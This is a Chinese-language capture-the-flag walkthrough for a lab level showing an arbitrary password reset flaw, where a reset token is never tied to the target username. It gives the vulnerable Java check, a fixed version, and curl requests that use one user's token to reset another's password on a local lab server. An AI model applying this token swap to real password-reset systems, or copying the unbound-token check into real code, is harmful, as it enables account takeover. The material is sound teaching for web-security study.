# Level 2 — 任意密码重置

## 关卡说明

本关模拟一个密码重置流程中存在逻辑漏洞的系统。系统在重置密码时，仅验证了验证码凭证 (Token) 的有效性，但没有校验凭证与用户账号的绑定关系，导致攻击者可以使用自己账号获取的凭证来重置他人密码。

**目标**：重置用户 `lucy` 的密码，成功后获取 Flag。

**关卡提示**：系统中有一个账号叫 `lucy`。

## 漏洞原理

### 代码逻辑分析

本关的后端代码位于 `PasswordResetController.java`，涉及三个关键接口：

| 接口 | 方法 | 说明 |
|------|------|------|
| `/api/challenge/auth-session/pwrest/send_code` | GET | 发送验证码（模拟邮件） |
| `/api/challenge/auth-session/pwrest/check_code` | GET | 验证验证码，返回重置凭证 |
| `/api/challenge/auth-session/pwrest/pw_rest` | POST | 重置密码 |

### 数据流

```
Step 1: 获取验证码
  GET /send_code?username=jack&email=jack@madrabbit.com
    ↓
  验证 username + email 匹配 → 生成 6 位验证码 → 存入 captchaStore
    ↓
  返回验证码（模拟邮件展示）

Step 2: 验证验证码，获取重置凭证
  GET /check_code?username=jack&email=jack@madrabbit.com&code=123456
    ↓
  验证验证码正确 → 生成 token → 存入 resetTokens(token → jack)
    ↓
  返回 token（通过 Cookie: pwreset_token）

Step 3: 重置密码
  POST /pw_rest  {username: "jack", newPassword: "xxx", token: "..."}
    ↓
  验证 token 存在于 resetTokens → ✅ 有效
  【漏洞】未校验 token 绑定的用户与请求中的 username 是否一致
    ↓
  修改 username 对应用户的密码
```

### 漏洞点详解

**关键代码**（`PasswordResetController.java` 第 254-263 行）：

```java
// 验证 token 是否存在
String tokenUsername = resetTokens.get(token);
if (tokenUsername == null) {
    result.put("message", "Invalid or expired verification token");
    return ResponseEntity.status(400).body(result);
}

// 【漏洞点】这里只验证了 token 的有效性，没有验证 token 与提交的 username 是否匹配
// 攻击者可以使用自己的 token，但修改 username 为他人账号来重置他人密码
```

`resetTokens` 的数据结构是 `Map<String, String>`，其中 `key = token`，`value = 验证时的用户名`。代码验证了 token 存在（即凭证有效），但**从未将 `tokenUsername`（凭证绑定的用户）与请求中的 `username`（要重置的目标用户）进行比对**。

### 正确做法

```java
// 安全写法：验证 token 与 username 的绑定关系
String tokenUsername = resetTokens.get(token);
if (tokenUsername == null || !tokenUsername.equals(username)) {
    result.put("message", "Invalid or expired verification token");
    return ResponseEntity.status(400).body(result);
}
```

## 通关步骤

### Step 1：用自己的账号获取验证码

系统用户 `lili` 的邮箱为 `lili@madrabbit.com`，该邮箱的验证码会在页面上模拟显示：

```
GET /api/challenge/auth-session/pwrest/send_code?username=lili&email=lili@madrabbit.com
```

响应：

```json
{
  "success": true,
  "message": "The email has been sent, please check",
  "code": "385712"
}
```

### Step 2：验证验证码，获取重置凭证

```
GET /api/challenge/auth-session/pwrest/check_code?username=lili&email=lili@madrabbit.com&code=385712
```

响应：

```json
{
  "success": true,
  "message": "Verification successful",
  "token": "e627322182563534b9bbd2c45f44efe74836eab92a8d640ab9775bf7a2fe0c85"
}
```

此 token 绑定的用户是 `lili`，但服务端在重置时不会检查这个绑定关系。

### Step 3：用 lili 的凭证重置 lucy 的密码

```bash
curl -X POST http://localhost:8080/api/challenge/auth-session/pwrest/pw_rest \
  -H "Content-Type: application/json" \
  -d '{"username":"lucy","newPassword":"hacked123","token":"e627322182563534b9bbd2c45f44efe74836eab92a8d640ab9775bf7a2fe0c85"}'
```

响应：

```json
{
  "success": true,
  "message": "Password reset successful",
  "flag": "flag{...}"
}
```

> **注意**：验证码和 token 都只能使用一次。如果验证码已过期，需重新获取。

### Step 4：提交 Flag

将获得的 Flag 提交到关卡右上角的 Flag 提交框中，即可通关。

## 涉及文件

| 文件 | 说明 |
|------|------|
| `controller/challenge/authsession/PasswordResetController.java` | 后端密码重置接口，凭证未绑定用户 |
| `static/challenges/auth-session/passwd-reset.html` | 前端关卡页面 |
| `service/FlagService.java` | Flag 获取与验证 |
| `service/UserService.java` | 用户查询与密码更新 |
